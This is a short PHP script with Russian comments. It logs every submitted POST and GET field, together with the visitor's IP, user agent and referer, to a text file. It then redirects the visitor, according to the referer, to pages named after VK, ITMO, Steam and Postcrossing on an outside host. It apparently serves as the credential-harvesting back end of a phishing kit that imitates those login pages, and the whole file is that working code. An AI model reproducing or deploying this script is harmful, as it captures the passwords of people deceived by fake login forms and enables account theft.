<?
$file="file2.txt"; //файл куда записываем все
$data=date("d.m.Y H:i"); //в скобках прописан формат отображения даты D - день недели, M - месяц Y - год, времени h - часы, i - минуты  
$ip=trim($_SERVER['REMOTE_ADDR']); //ip
$sysinfo=trim($_SERVER['HTTP_USER_AGENT']); //много всякой информации
if(is_file($file)){ //Проверяем наличие файла и возможность работы с ним 
$fo=fopen($file,"a+"); //Открываем файл на запись в конец 
$res2 = print_r($_POST, true); //методом POST все берем
$res3 = print_r($_GET, true); //методом GET все берем
$res4 = $_SERVER['HTTP_REFERER']; //откуда пришел пользователь
$res="\n$data  |  $ip  |  $sysinfo |  $res4 |\nPOST: $res2 \nGET: $res3";
$fw=fwrite($fo,$res); //Записываем в файл 
fclose($fo); //Закрываем файл 
}
//перенаправление на другой сайт
$service  = $res4;
$service  = substr($service,26);
$service  = substr($service,0,stripos($service,"/"));
echo($service);
switch ($service){
    case "vk":
        header("Location: http://flagruger.16mb.com/vk/");
        die(); break;
    case "ifmo":
        header("Location: http://flagruger.16mb.com/ifmo/");
        die(); break;
    case "steam":
        header("Location: http://flagruger.16mb.com/steam/");
        die(); break;
    case "postcrossing":
        header("Location: http://flagruger.16mb.com/postcrossing/");
        die(); break;
}
?>